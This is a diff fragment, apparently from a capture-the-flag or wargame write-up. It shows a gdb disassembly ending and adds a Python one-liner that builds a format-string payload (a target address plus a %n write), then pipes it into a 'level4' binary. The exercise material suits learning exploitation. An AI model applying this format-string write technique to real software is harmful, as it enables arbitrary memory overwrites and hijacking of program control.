@@ -42,3 +42,5 @@ Dump of assembler code for function p:
    0x08048456 <+18>:	ret    
 End of assembler dump.
 (gdb) 
+python -c "print '\x08\x04\x98\x10'[::-1] + '%16930112d%12\$n'" > /tmp/4
+cat /tmp/4 | ./level4
